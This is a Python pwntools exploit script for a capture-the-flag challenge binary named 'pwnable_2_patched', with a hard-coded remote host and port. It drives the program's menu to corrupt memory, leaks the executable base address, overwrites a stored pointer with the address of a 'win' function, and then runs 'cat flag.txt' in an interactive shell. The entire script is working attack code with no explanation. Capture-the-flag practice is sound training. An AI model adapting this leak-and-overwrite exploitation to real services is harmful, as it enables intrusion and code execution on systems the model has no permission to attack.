#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 13335
HOST = "103.197.184.48"
exe = context.binary = ELF('./pwnable_2_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            source /home/nhh/pwndbg/gdbinit.py

            # add_command
            brva 0x00000000000019B1
            brva 0x00000000000017C0
            brva 0x0000000000001AAA
            brva 0x00000000000018A6
            brva 0x0000000000001675
            brva 0x0000000000001755

            # grow_vec
            brva 0x00000000000014F7
            brva 0x0000000000001539

            # add_console
            brva 0x0000000000001E4E
            brva 0x0000000000001E9A

            # chose_console
            brva 0x0000000000001F4B

            # get_command
            brva 0x0000000000001B64
            brva 0x0000000000001C16
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

def add_command(choice = str(3), cmd = b'command'):
    p.sendlineafter(b'\n', str(choice))
    p.sendlineafter(b': ', cmd)

def get_command(idx):
    p.sendlineafter(b'\n', str(2))
    p.sendlineafter(b'(start = 0): ', str(idx))

def add_console():
    p.sendlineafter(b'\n', str(4))

def chose_console(idx):
    p.sendlineafter(b'\n', str(5))
    p.sendlineafter(b'(start 0) : ', str(idx))

# VARIABLE


# PAYLOAD

p.sendlineafter(b'\n', str(1))
for i in range(11):
    add_command()
add_command(str(1))
add_command()
p.sendlineafter(b'\n', str(5)) # exit

for i in range(9):
    add_console()

for i in range(9):
    chose_console(i + 1)
    p.sendlineafter(b'\n', str(1))
    add_command(str(2))
    p.sendlineafter(b'\n', str(5)) # exit

for i in range(4):
    add_console()

GDB()
chose_console(0)

get_command(12)
p.recv(0x10)
exe_leak = u64(p.recv(6) + b'\0'*2)
exe.address = exe_leak - 0x13f5
log.info("Exe base: " + hex(exe.address))
win = exe.sym.win
log.info("Win: " + hex(win))

# change command
# GDB()
p.sendlineafter(b'\n', str(1))
p.sendlineafter(b'\n', str(4))
p.sendlineafter(b'(start 0): \n', str(12))
payload = b'1'*0x20 + p64(win)
p.sendlineafter(b'edit: ', payload)
p.sendlineafter(b'\n', str(5)) # exit

chose_console(12)

p.sendlineafter(b'\n', str(1))
p.sendlineafter(b'\n', str(1))
p.sendline()
p.sendline(b'cat flag.txt')

p.interactive()